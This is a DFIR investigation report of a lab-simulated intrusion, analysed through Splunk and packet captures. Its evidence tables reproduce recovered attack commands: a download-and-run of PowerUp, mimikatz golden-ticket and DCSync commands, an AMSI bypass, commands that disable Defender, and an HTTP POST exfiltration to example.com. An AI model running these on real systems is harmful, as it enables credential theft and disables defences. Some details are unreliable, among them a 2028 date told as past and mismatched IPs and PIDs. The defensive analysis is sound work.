## Introduction 
During this scenario, I conducted a DFIR investigation using Splunk logs and the PCAP network traffic to detect and confirm the attacker’s presence and identify IOCs:
-	Documented the key findings,
-	Mapped the attacker’s activities to the cyber kill chain and the findings to MITRE ATT&CK with a detailed timeline and supporting evidence 
-	Reconstructed the attacker’s activities :
Phishing: (malicious attachment) --> Discovery: (privilege escalation vulnerabilities) --> credential access --> Discovery: (network shares and Wi-Fi) --> Security control tampering --> Exfiltration --> Evidence removal 
-	Provided recommendations for each identified finding
## Executive summury
On approximately 28/07/2028 at 10:43:53 UTC the host DESKTOP-2A1O8LD was subjected to GoldenPhantom_APT_Attack_Operation attack.
The attacker obtained initial access via the download of a malicious attachment delivered through phishing. The attachment silently performed enumeration activities including privilege escalation vulnerabilities, Wi-Fi scanning and all network shares. Additionally, it extracted user credentials and hashes, attempted to forge a Golden Ticket and to impersonate Domain controller behavior to request password hashes and other sensitive information.
Tampering with host security controls was detected including AMSI and Microsoft defender. 
Finally, the attacker attempted to exfiltrate collected information to an unauthorized destination.
#### Severity assessment: critical 
#### Affected assets 
-	Hostname: DESKTOP-2A1O8LD 
-	IP address:192.168.67.140
-	MAC address:00:0c:29:e5:73:d4 
-	Domain: anmar 
-	Operating system: 64-bit Windows 10 (22H2), build 19045
-	Hardware: 12th Gen Intel(R) Core(TM) i7-12700H
-	Asset type: Workstation 
-	Compromised accounts: anmar 
#### Adversary Profile: 
-	Name: GoldenPhantom
-	Target :financial institution 
-	Motivation: financially motivated
-	Objective: Social engineering, credential theft, breach networks, steal sensitive data  
-	Tools used : off the shelf tools including caldera, invoke-mimikatz.ps, powerup.ps, snaffler, werkzeug and python iaohttp
## Tools 
-	Wireshark :used to analyze and  investigate the network traffic capture and identify suspicious communications
-	Splunk: used to analyze and correlate log evidence with networks activities

## 1.Methodology 
### 1.1.Attacker presence detection  
Analysis of network traffic analysis identified that 192.168.67.128 corresponds to the attacker caldera C2 server, while 192.168.67.140  corresponds to the compromised host DESKTOP-2A1O8LD, running  a masquerading  splunkd.exe agent disguised as a legitimate splunk process, executed from the C:\Users\Public location instead of the expected location C:\Program Files\Splunk\bin. 

<img width="945" height="643" alt="image" src="https://github.com/user-attachments/assets/334fc843-13ed-4228-a598-2e654d1ede74" /></br>
### 1.2.Initial access detection 
#### 1.2.1.initial access: phishing attachment
Powershell Event ID 53504 revealed a powershell process 9400 opened IPC listening thread on the host DESKTOP-2A1O8LD at 10:46:57 UTC. This PID corresponds to the caldera ability T1566.001 (Download Macro-Enabled Phishing Attachment), indicating that initial access was obtained through the download of xlsm attachment delivered via phishing.</br>

| Timeline | 10:46:57 UTC |
|---|---|
| **command** | `$url = '[https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm](https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm)'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP PhishingAttachment.xlsm` |
| **Host** | DESKTOP-2A1O8LD |
| **Caldera mapping** | PID: 9400 à T1566.001 |
| **SID** | S-1-5-21-2053833827-3235952737-1524074619-1001(anmar account) |

The network traffic stream 377 activity confirms the download of the malicious attachment corroborating  the evidence identified in Event ID 53504
<img width="983" height="553" alt="image" src="https://github.com/user-attachments/assets/9f683616-33ad-4b62-9c20-a326b9e881cf" /></br>
#### 1.2.2.valid account: successful login
Filtering EventID 4624 successful login revealed a successful login associated with anmar account on host DESKTOP-2A1O8LD at 10:43:53 UTC. This indicates that the attacker abuses anmar credentials to gain initial access to the host.
<img width="945" height="679" alt="image" src="https://github.com/user-attachments/assets/d2672e75-df6c-48f5-9bdf-c9a5f27bfffe" /></br>
### 1.3.Reconnaissance detection :	
#### 1.3.1.Privilege escalation vulnerabilities:
Powershell Event ID 4104 (Script Block logging) revealed a PowerUp.ps script loaded under PID 10044 on host DESKTOP-2A1O8LD at 10:48:42 UTC. PowerUp.ps is a script used to identify privilege escalation vulnerabilities on windows machines.</br>
Powershell Event ID 4103 (Module Logging) recorded a command invocation that downloaded and executed PowerUp.ps1 script with invoke-AllChecks parameter on host DESKTOP-2A1O8LD.This activity confirms that privilege escalation vulnerabilities were enumerated on that host.</br>

| Timeline | 10:48:42 UTC |
|---|---|
| **command** | `powershell.exe -ExecutionPolicy Bypass -C [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1) -UseBasicParsing); Invoke-AllChecks` |
| **Host** | DESKTOP-2A1O8LD |
| **Caldera mapping** | PID: 10044<br>T1059.001 |
| **user** | DESKTOP-2A1O8LD\\anmar |

By executing the PowerUp.ps1 script the agent gained the capability to:
-	Enumerate services
-	Exploit modifiable services
-	Discover Dll hijacking opportunities
-	Discover modifiable schedule task
-	Discover registry misconfiguration
-	User has elevated privileges (admin privileges)
<img width="983" height="385" alt="image" src="https://github.com/user-attachments/assets/2188a314-62fc-4397-be97-79a1928eb0cc" /></br>
<img width="944" height="461" alt="image" src="https://github.com/user-attachments/assets/8b831223-d067-4ab0-87ec-6bfdebd43430" /></br>
#### 1.3.2.Network discovery :
Powershell Event ID 53504(Named Pipe IPC) revealed that a powershell process 11156 opened an IPC listening thread at  10:51:43 UTC. This PID corresponds to the caldera ability T1135 (Network Share Discovery) , in which  the agent attempted to execute the  Snaffler tool to  enumerate available network shares on host DESKTOP-2A1O8LD .</br>

| Timeline | 10:51:43 UTC |
|---|---|
| **Command** | `invoke-expression 'cmd /c start powershell -command { cmd /c "...\Snaffler.exe" -a -o "$env:temp\T1135SnafflerOutput.txt" };` |
| **Host** | DESKTOP-2A1O8LD |
| **PID** | 11156 à T1135 |
| **SID** | S-1-5-21-2053833827-3235952737-1524074619-1001(anmar account) |

##### What is snaffler?
Snaffler is a cybersecurity tool designed to automate the discovery of sensitive information within Windows and Active Directory environments.</br>
Additionally, powershell process PID 8492 opened an IPC listening thread at 10:53:52 UTC as recorded by Event ID 53504. This PID corresponds to the caldera ability T1016.002 (Scan WIFI networks),in which the agent attempted an obfuscated script to scan the host DESKTOP-2A1O8LD for available Wi-Fi networks .</br>

| Timeline | 10:53:52 UTC |
|---|---|
| **Command** | `obfuscated_payload.ps1 -Scan` |
| **Host** | DESKTOP-2A1O8LD |
| **Caldera mapping** | 8492 à T1016.002 |
| **user** | DESKTOP-2A1O8LD\\anmar |

<img width="945" height="535" alt="image" src="https://github.com/user-attachments/assets/71728254-6a51-4861-b887-6c4096536556" /></br>
### 1.4.Credential access detection :
#### 1.4.1.Forge golden ticket:
Powershell Event ID 53504(Named Pipe IPC) revealed that a powershell process  9492 opened an IPC listening thread at  10:49:15 UTC. This PID  corresponds to  T1558.001 caldera ability( forge golden ticket). In this activity, the agent attempted to retrieve krbtgt hash of the user account, purge existing tickets (klist purge) and use mimikatz to forge golden ticket.</br>

| Timeline | 10:49:15 UTC |
|---|---|
| **Commands** | `mimikatz.exe kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt"`<br><br>`klist purge` |
| **Caldera mapping** | PID:9492 à T1558.001 |
| **Host** | DESKTOP-2A1O8LD |
| **user** | DESKTOP-2A1O8LD\anmar | 

#### 1.4.2.Credential dump
Powershell Event ID 4104 revealed that invoke-mimikatz.ps1 script was loaded under PID 2188 at 10:49:54 UTC on host DESKTOP-2A1O8LD.This activity corresponds to caldera ability mimikatz under PID 7744, in which the agent attempted to extract credential from LSASS memory using DumpCred parameter.</br>

| Timeline | 10:49:54 UTC. |
|---|---|
| **Script** | `Invoke-Mimikatz.ps -DumpCred` |
| **PID** | 2188: splunk evidence<br><br>7744: caldera evidence |
| **Host** | DESKTOP-2A1O8LD |
| **user** | DESKTOP-2A1O8LD\anmar |

Splunk logs indicate that PID 7744 was associated with exfiltration activity at 10:57:53 UTC. This suggests that credentials obtained during mimikatz executed were then used for the exfiltration phase.</br>
The execution of mimikatz PID 7744 is confirmed by the observed network activity in stream 7744 at at 10:49:52 UTC.</br>
<img width="983" height="499" alt="image" src="https://github.com/user-attachments/assets/9095ef54-4fd6-40fa-9773-633d9e471b68" /></br>
<img width="983" height="522" alt="image" src="https://github.com/user-attachments/assets/aa2f84cc-3ddb-4852-9215-10e5d4d73564" /></br>
#### 1.4.3.DCsyn 
Network activity associated with caldera ability T1003.006  under PID 2172 at 10:50:53 UTC was observed. During this activity the agent failed to execute DCSyn attack using mimikatz.
<img width="983" height="509" alt="image" src="https://github.com/user-attachments/assets/bfe0589b-dd2d-431e-86e6-c52279cd6f5c" />/br>
### 4.3.What is Golden ticket attack?
Is a Kerberos exploitation technique where adversaries use KRBTGT account hash from AD Active Directory to forge Ticket Granting Ticket TGTs.
#### 1.4.4. What is DCSync attack?
Is an attack where adversaries impersonate legitimate DC Domain Controller to request password hashes and sensitive information from other DCs.</br>

| Timeline | 10:50:53 UTC |
|---|---|
| **Commands** | `mimikatz.exe lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%` |
| **Caldera mapping** | PID: 2172 àT T1003.006 |
| **Host** | 192.168.67.140 |

### 1.5.Security controls tampering detection:
#### 1.5.1. AMSI Bypass AMSIInitFailed setting 
Powershell Event ID 4104 revealed that a script loaded on host DESKTOP-2A1O8LD  at 10:54:32 UTC under PID 528 designed to bypass AMSI security controls by setting  AMSIInitFailed to true. This PID corresponds to caldera ability T1685 (AMSI Bypass - AMSI InitFailed), in which the agent attempted to bypass AMSI (Antimalware Scan Interface) inspection.</br>

| Timeline | 10:54:32 UTC |
|---|---|
| **script** | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |
| **Host** | DESKTOP-2A1O8LD |
| **Caldera mapping** | PID:825 à T1685 |
| **User** | DESKTOP-2A1O8LD\\anmar |

<img width="945" height="332" alt="image" src="https://github.com/user-attachments/assets/d89261c4-ab4b-4283-8c0f-53334034a494" /></br>
#### 1.5.2. AMSI Bypass: create registry key
Powershell Event ID 53504 (Named Pipe) recorded a powershell process PID 11624 opened an IPC listening thread at 10:55:18 UTC on host DESKTOP-2A1O8LD. This activity corresponds to caldera ability T1685 (AMSI Bypass - Create AMSIEnable Reg Key), in which the agent attempted to disable AMSI by creating a registry key, confirming the exploitation of  modifiable registry opportunity discovered on recon phase.</br>

| Timeline | 10:55:18 UTC |
|---|---|
| **command** | `New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" \` -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force \| Out-Null` |
| **Host** | DESKTOP-2A1O8LD |
| **Caldera mapping** | PID:11624 à T1685 |
| **user** | DESKTOP-2A1O8LD\\anmar |

#### 1.5.3.Disable real time protection or stop Microsoft Defender
Powershell Event ID 4104 revealed that a script was loaded, exposing set-MpPreference function on the host DESKTOP-2A1O8LD at 10:57:10 under PID 5632.This PID corresponds to the caldera ability T1562.001 (Disable Windows Defender Real-Time Protection), in which the agent attempted to disable real-time monitoring  using set-MpPreference function if it was available, otherwise, it attempted to stop Microsoft Defender service if it was running.</br>

| Timeline | 10:57:10 UTC |
|---|---|
| **Command** | `Set-MpPreference -DisableRealtimeMonitoring 1;} else { $service = Get-Service WinDefend -ErrorAction SilentlyContinue; if ($service) { if ($service.Status -eq "Running") { Stop-Service WinDefend; } } else { echo "Windows Defender service not found.` |
| **Host** | DESKTOP-2A1O8LD |
| **Caldera mapping** | PID 5632 à T1562.001 |
| **User** | DESKTOP-2A1O8LD\\anmar |

### 1.6.Exfiltration detection
#### 1.6.1.C2 beaconing detection
Persistent beaconing activity was observed every 30 seconds,  originating from C2 server 192.168.67.128:8888/beacon endpoint to the host 192.168.67.140.
<img width="945" height="674" alt="image" src="https://github.com/user-attachments/assets/54cf541e-0e42-4da2-92fd-d5b277ae7e1b" /></br>
#### 1.6.2.Failed exfiltration detection
Powershell Event ID 4100 revealed  a server error (HTTP code status 405 – method not allowed) on host DESKTOP-2A1O8LD at 10:57:53 UTC under PID 7744.The rejected request represents an attempted data exfiltration using invoke-webRequest with HTTP POST method. PID 7744 was associated with credential dumping activity, indicating that the extracted credentials (section 3.2 credential dump detection) were targeted for exfiltration to C2 server.
This activity maps to caldera ability T1041 (C2 Data Exfiltration) and confirms that the agent attempted to exfiltrate collected data to the C2 server over HTTP protocol.</br>

| Timeline | 10:55:18 UTC |
|---|---|
| **Command** | `powershell.exe -ExecutionPolicy Bypass -C if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ ; 1..100 \| ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $\_." }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive` |
| **Host** | DESKTOP-2A1O8LD |
| **Caldera mapping** | PID 7744 à T1041 |
| **User** | DESKTOP-2A1O8LD\\anmar |

<img width="945" height="469" alt="image" src="https://github.com/user-attachments/assets/de57f3d8-8992-4bb5-ae06-8a8bc04ab2da" /></br>
### 1.7. Evidence removal :
The agent removed evidence from the compromised host DESKTOP-2A1O8LD to hide their traces including the malicious attachment downloaded(PhishingAttachment.xlsm) and the enumeration of accessible network share(T1135SnafflerOutput.txt).</br>

| Timeline | PID | Actions |
|---|---|---|
| **10:46:57 UTC** | 9400 | `Remove-Item $env:TEMP PhishingAttachment.xlsm` |
| **10:52:42 UTC** | 11156 | `remove-item "$env:temp T1135SnafflerOutput.txt" -force` | 

## 2.Findings 

| Phases | Evidence source | Findings |
|---|---|---|
| **GoldenPhantom presence detection** | Pcapng file | Splunkd.exe, located in C:\Users\Public, is masquerading as a legitimate process running from non-standard location : malicious executable<br><br>192.168.67.140 : compromised host<br><br>192.168.67.128:8888/beacon : C2 server<br><br>192.168.67.128:5000/api/command: Command-relay server controlling C2 |
| **Initial access** | Event ID 53504<br>Event ID 4624 | Initial access obtained through malicious attachment .xlsm delivered via phishing<br><br>Successful login using anmar user account |
| **Reconnaissance** | Event ID 4103, Event ID 4104, pcapng | Privilege escalation vulnerabilities enumeration was performed<br><br>Network activity discovery performed including available networks shares and available Wi-Fi |
| **Credential access** | Event ID 4104, Event ID 53504, pcapng | Invoke-mimikatz.ps script was loaded in memory and used to extract credentials from LSASS<br><br>Mimikatz.exe was used to execute forge golden ticket<br><br>Failed DCSyn attack |
| **Security controls tampering** | Event ID 4104, Event ID 53504 | AMSIInitFailed=true to bypass AMSI inspection<br><br>Attempt to disable AMSI using registry key<br><br>Attempt to disable real-time monitoring and stop Microsoft defender service |
| **Exfiltration** | Event ID 4100 | C2 beaconing was observed at every 30 seconds<br><br>Failed exfiltration attempt over http protocol |
| **Evidence removal** | pcapng | Deleted PhishingAttachment.xlsm and T1135SnafflerOutput.txt |

## 3.Assessment of finding activities 

| Activity | PID | Assessment | Severity |
|---|---:|---|---|
| **Phishing** | 9400 | Confirmed | High |
| **Anmar credentials compromise: successful login using anmar account** |  | Confirmed | High |
| **Privilege escalation vulnerabilities enumeration** | 10044 | Not completed | low |
| **Forge golden ticket using mimikatz** | 9492 | Unconfirmed | critical |
| **Credential dumping using mimikatz** | 7744 | Confirmed | critical |
| **DCSync** | 2172 | Unconfirmed | Critical |
| **Enumerate All Network Shares with Snaffler** | 11156 | Not completed | low |
| **Scan WIFI networks** | 8492 | Unconfirmed | low |
| **AMSI Bypass - AMSI InitFailed** | 528 | Confirmed | high |
| **AMSI Bypass - Create AMSIEnable Reg Key** | 11624 | Confirmed | high |
| **Disable Windows Defender Real-Time Protection or stop Microsoft defender if running** | 5632 | Confirmed | critical |
| **C2 Data Exfiltration** | 7744 | Unconfirmed | high |

## 4.Cyber kill chain mapping 
<img width="975" height="532" alt="image" src="https://github.com/user-attachments/assets/15e441be-554b-42f7-9bbc-65400fb140d0" /></br>
## 5.Mitre attack mapping, timeline and evidence:

| ***Timeline*** | *Activity* | ***Tactic*** | ***Mitre attack technique*** | ***Evidence*** |
|---|---|---|---|---|
| ***10:43:53 UTC*** | Phishing download of malicious attachment | Initial access | T1566.001 - Phishing : Spearphishing Attachment | Event ID 53504 |
| | Successful login using anmar account | | T1078 – valid accounts | Event ID 4624 |
| **10:48:42 UTC** | Privileges escalation vulnerabilities enumeration | Execution | T1059.001 -Command and scripting powershell | Event ID 4103<br>Event ID 4104<br>pcapng |
| | | Discovery | T1026 – permission group discovery<br>T1082 – system information discovery | |
| | | Persistence | T1053 – scheduled task<br>T1112- Modify registry<br>T1543 -create or modify system process | |
| **10:49:15 UTC** | Credential access | Credential access | T1558.001- Steal or forge Kerberos ticket:Golden ticket | Event ID 4104<br>Event ID 53504<br>pcapng |
| **10:49:52 UTC** | | | T1003.001 – OS credential dumping: Lsass memory<br> | |
| **10:50:53 UTC** | | | T1003.006 OS Credential dumping: DCSync | |
| **10:51:43 UTC** | Discovery of network shares and wifi scanning | Discovery | T1135 - Network Share discovery | Event ID 53504<br> |
| **10:53:52 UTC** | | | T1016.002 -System Network Discovery: wifi discovery | |
| **10:54:32 UTC** | Security controls tampering | Defense impairment | T1685 - Disable or modify tools(ByPass AMSI)<br> | Event ID 4104<br>Event ID 53504<br> |
| **10:55:18 UTC** | | Privilege escalation | T1068 - Exploitation of privilege escaltation | |
| **10:57:10 UTC** | | Impair defenses | T1562.001 - Disable<br>Windows Defender Real-Time Protection<br>T1489 – Stop service | Event ID 4104 |
| **10:57:53 UTC** | Exfiltration | Exfiltration | T1048 – Exfiltration over alternative protocol<br>T1041 – Exfiltration over C2 channel | Event ID 4100 |
| ** ** | | Masquerading | T1036.005 - Masquerading: match legitimate resource name or location | pcapng |
| ** ** | Evidence removal | Stealth | T1070.004 - Indicator Removal: File Deletion | pcapng |

## 6.IOCs:

| Category | Details |
|---|---|
| **IPs** | - 192.168.76.140: compromised machine<br>- 192.168.76.128: C2 server<br>- 185.199.109.133: used to download PowerUp.ps script |
| **URLs** | - 192.168.67.128:8888/beacon: C2 server endpoint<br>- 192.168.67.128:5000/api/command :Command relay server endpoint |
| **Ports** | - 8888: port on which the C2 server listens from /beacon endpoint<br>- 5000: port on which C2 server listens for requests from /api/command endpoint |
| **Compromised account** | - DESKTOP-2A1O8LD\\anmar |
| **Command line parameter** | - DisableKeepAlive: evade detection |
| **Masquerading location** | - C:\Users\Public was used to run splunkd.exe process |
| **Masquerading binary** | - Splunkd.exe :masquerading as legitimate process |
| **Command line parameter** | - ExecutionPolicy Bypass : to bypass restriction policies<br>- klist purge was used to list removed tickets<br>- kerberos::golden :was used to forge golden tickets<br>- lsadump::dcsyn : was used for dcsync<br>- AMSIInitFailed=true: to bypass AMSI inspection<br>- Registry key: Name "AmsiEnable" -Value 0 : registry key to Bypass AMSI inspection<br>- Set-MPPreference -DisableRealtimeMonitoring<br>- Stop-Service WinDefend |
| **Scripts** | - powerup.ps: pwersploit script used to enumerate privilege escalation vulnerabilities<br>- invoke-mimikatz.ps1: script used to download mimikatz in memory and dump credentials<br>- obfuscated_payload.ps1: used to scan the compromised host for available Wi-Fi |
| **Files** | - splunkd.exe : caldera agent<br>- PhishingAttachment.xlsm: malicious attachment for initial access<br>- mimikatz.exe: used for golden tickets and dcsync attacks<br>- snaffler.exe : used to enumerate network shares on the compromised host |
| **Affected assets** | - Hostname: DESKTOP-2A1O8LD<br>- Windows x64 |

## 7.Recommendations 
#### Containment 
-	Isolate the compromised host DESKTOP-2A1O8LD  using Microsoft Defender to contain the attack
-	Block  communication with 192.168.67.140 at the firewall to disrupt  the attacker’s communication
-	Block outbound and inbound traffic from and to host 192.168.67.128 using firewall rules
-	Block malicious email attachments with .xlsm extension on Email Security Gateway 
-	Disable anmar account
#### Eradication 
-	Delete the malicious downloaded script powerup.ps1, invoke-mimikatz.ps1 and obfuscated_payload.ps1 from DESKTOP-2A1O8LD host 
-	Reset anmar credentials 
-	Delete the malicious software splunkd.exe, mimikatz.exe from DESKTOP-2A1O8LD host
-	Conduct user awareness training to educate employees recognizing phishing attempts 
-	Enable 2MFA to harden the authentication process 
-	Enforce unique and complex passwords
-	Implement email authentication protocols SPF,DKIM and DMARC to prevent phishing and spoofing 
-	Update security controls by adding signatures of malicious identified files and scripts: mimikatz.exe, splunkd.exe, snaffler.exe, PhishingAttachment.xlsm, invoke-mimikatz.ps1 and powreUp.ps1
-	Implement least privilege by granting user accounts only the permissions required
-	Implement Microsoft Credential Guard to prevent unauthorized access and credential theft
-	Implement strong password policies for administrator accounts by ensuring the use of unique and complex passwords across all the network
-	Restrict standard users from accessing Replicating Directory Changes permission and other privileges associated with domain controller replication
-	Reset the built-in KRBTGT account password twice to invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it.
-	Monitor and alert on Snaffler enumeration activity by writing suricata detection rules 
-	Implement behavioral detection rules to detect and alert on unauthorized wifi enumeration activity
-	Implement behavioral detection rules to identify attempts to bypass AMSI
-	Restrict registry permissions to prevent users from modifying registry keys that lead to privilege escalation
-	Establish a baseline of normal network traffic and implement monitoring using suricata to detect and alert on suspicious outbound communications 
-	Implement Data Loss Prevention DLP controls to prevent sensitive data from being transferred to unauthorized channels
#### Lessons learned:
- Regular user awareness training should be performed to educate people identifying and recognizing phishing emails, as phishing was identifying the initial attack vector in this incident. 
- Security email controls such as filtering and attachments scans should be strengthened to reduce phishing incidents 
## 8.KG
<img width="975" height="474" alt="image" src="https://github.com/user-attachments/assets/cfb2be3c-932c-4185-ba8c-a5956291f963" /></br>
## Conclusion 
All tasks were successfully completed, including identification of GoldenPhantom’s network presence and the corresponding indicator of compromises IOCs .However, the following IOCs could not be identified: 

| Flag | Mitre technique ID | Mitre name |
|---|---|---|
| **F12** | T1136 | Create account |
| **F13** | T1098 | Account manipulation: Additional could credential |
| **F16** | T1110 | Brute force technique |






